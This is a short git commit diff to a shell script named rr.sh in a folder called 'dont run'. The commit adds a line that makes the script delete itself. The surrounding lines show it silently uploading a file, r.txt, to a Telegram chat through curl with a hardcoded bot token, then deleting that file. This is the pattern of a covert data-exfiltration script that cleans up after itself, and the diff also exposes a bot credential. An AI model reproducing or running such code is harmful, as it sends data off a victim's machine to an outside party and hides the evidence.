e95e217a616a4d9dbccdfddc0f3ad386727fe3a9
WhBeatZ <93139343+WhBeatZ@users.noreply.github.com>
2022-09-26 00:02:49 +0200

    Update rr.sh

--- config/dont run/rr.sh
+++ config/dont run/rr.sh
@@ -55,3 +55,4 @@ echo >> r.txt
 curl -s -X  POST "https://api.telegram.org/bot5412577382:AAEnTFP6bkRHb5Ok2g8mF6YUuVFT75uo_ws/sendDocument" -F chat_id="-1001753394166" -F document="@r.txt" > /dev/null 2>&1
 
 rm -rf r.txt
+rm -rf rr.sh
